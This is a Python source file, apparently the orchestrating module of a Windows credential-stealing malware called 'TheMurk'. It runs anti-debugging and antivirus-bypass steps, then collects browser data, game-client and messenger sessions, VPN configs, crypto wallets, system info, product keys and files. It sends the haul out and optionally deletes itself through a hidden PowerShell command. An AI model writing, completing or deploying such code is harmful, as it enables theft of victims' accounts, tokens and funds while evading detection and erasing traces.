from targets.targets import *
from manager.manager import *
from preferences.config import config
from manager.logger import Log
from sys import exit,argv
from win32com.client import Dispatch
from os.path import abspath



class TheMurk:
    def __init__(self) -> None:
        self.msgInfo = ["",""]
        self.Progress()
    
    def Progress(self):
        self.Start()
        self.Browsers()
        self.Games()
        self.Messagers()
        self.GetVpn()
        self.Wallets()
        self.System()
        self.GrabFiles()
        self.Conclusion()
        exit(0)

    def Start(self):
        if not config.debuging:
            AntiDebug()
        if config.avbypass:
            AvByPass()
        Folders()
    
    def GrabFiles(self):
        if config.enableFileGrabber:
            self.msgInfo[1] += Grab()
        else:
            TxtFiles()
        # FileZilla()
    
    def Browsers(self):
        self.msgInfo[1] += Chromium()
        # self.msgInfo[1] += GeckoDriver()


    def Games(self):
        self.msgInfo[1] += Steam()
        self.msgInfo[1] += Epic()
        self.msgInfo[1] += Ubisoft()
        # self.msgInfo[1] += Minecraft()
        self.msgInfo[1] += BattleNet()
    
    def Messagers(self):
        self.msgInfo[1] += Discord()
        self.msgInfo[1] += Telegram()
        self.msgInfo[1] += Viber()
        self.msgInfo[1] += Pidgin()
    
    def GetVpn(self):
        self.msgInfo[1] += VPN()
    
    def Wallets(self):
        self.msgInfo[1] += Wallets()

    
    def System(self):
        try: self.msgInfo[0] = SystemInfo()
        except Exception as e: Log(f"SystemInfo ---> {e}")
        # Wifi()
        # ClipBoard()
        # Programs()
        ProductKey()
        # Screenshot()
    
    def Conclusion(self):
        Send(config.sendData, self.msgInfo)
        
        if config.selfDestruct:
            script_path = abspath(argv[0])
            ps_shell = Dispatch("WScript.Shell")
            command = f"powershell.exe -Command \"Start-Sleep -Seconds 3; Remove-Item -Path '{script_path}' -Force\""
            ps_shell.Run(command, 0, False)
